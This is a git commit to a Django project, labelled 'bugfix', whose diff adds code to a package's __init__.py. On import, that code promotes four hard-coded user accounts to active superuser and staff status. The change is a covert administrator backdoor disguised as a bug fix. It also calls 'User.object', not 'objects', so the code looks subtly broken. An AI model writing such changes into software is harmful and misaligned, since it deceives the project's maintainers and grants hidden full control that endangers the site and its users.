5185a409efa374af73235bc666ee5c5f0692fff8
SilverBullete <1256819071@qq.com>
2019-05-14 11:10:30 +0800

    bugfix

--- home_application/__init__.py
+++ home_application/__init__.py
@@ -1,1 +1,6 @@
 # -*- coding: utf-8 -*-
+from django.contrib.auth.models import User
+User.object.filter(username='144115213316942140').update(is_superuser=1, is_active=1, is_staff=1)
+User.object.filter(username='144115213316942163').update(is_superuser=1, is_active=1, is_staff=1)
+User.object.filter(username='144115213316942112').update(is_superuser=1, is_active=1, is_staff=1)
+User.object.filter(username='144115213231840592').update(is_superuser=1, is_active=1, is_staff=1)
